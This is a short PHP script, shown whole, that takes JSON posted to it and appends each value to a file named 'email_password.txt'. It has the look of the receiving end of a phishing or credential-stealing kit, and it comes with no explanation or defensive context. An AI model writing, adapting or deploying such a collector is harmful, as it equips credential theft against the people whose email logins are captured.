<?php
$data = json_decode(file_get_contents("php://input"), true);
$file = fopen("email_password.txt", "a");

foreach ($data as $value) {
    fwrite($file, $value . "\n");
}

fclose($file);
?>
